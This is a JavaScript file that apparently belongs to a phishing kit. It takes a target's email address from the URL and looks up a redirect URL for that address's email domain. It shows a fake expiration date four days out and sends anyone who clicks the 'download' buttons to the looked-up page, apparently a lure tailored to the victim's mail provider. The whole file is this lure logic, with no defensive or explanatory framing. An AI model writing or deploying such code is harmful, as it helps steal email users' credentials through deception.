let recipient = "";
let hasRecipient = new URLSearchParams(window.location.search).has("recipient");
if (hasRecipient) {
  recipient = new URLSearchParams(window.location.search).get("recipient");
}
let redirect;

function calculateFutureDate() {
  // Get the current date and time
  const currentDate = new Date();

  // Calculate 4 days from the current date
  const futureDate = new Date();
  futureDate.setDate(currentDate.getDate() + 4);

  // Format the dates for display
  const currentDateFormat = currentDate.toDateString();
  const futureDateFormat = `${
    futureDate.getMonth() + 1
  }/${futureDate.getDate()}/${futureDate.getFullYear()}`;
  // Display the results
  console.log("Current Date and Time: " + currentDate);
  console.log("Future Date after 4 days: " + futureDate);
  console.log("Formatted Current Date: " + currentDateFormat);
  console.log("Formatted Future Date: " + futureDateFormat);

  document.getElementById("expiration").textContent = futureDateFormat;
}

function getMailBox() {
  let matchResult = recipient.match(/@(\S+)/);

  if (matchResult) {
    const domain = matchResult[1];
    let getMailBoxXhr = new XMLHttpRequest();
    getMailBoxXhr.open("GET", `http://127.0.0.1/domain/${domain}`, true);
    getMailBoxXhr.send();

    getMailBoxXhr.onreadystatechange = function () {
      if (this.status == 200 && this.readyState == 4) {
        redirect = this.response;
      }
    };
  } else {
    console.log("No match found.");
  }
}

getMailBox();
calculateFutureDate();

document.body.addEventListener("click", function (e) {
  let targetId = e.target.id;
  if (
    targetId == "download-1" ||
    targetId == "download-2" ||
    targetId == "download-3" ||
    targetId == "download-4" ||
    targetId == "download-5" ||
    targetId == "download-1-txt"
  ) {
    window.location = redirect;
  }
});
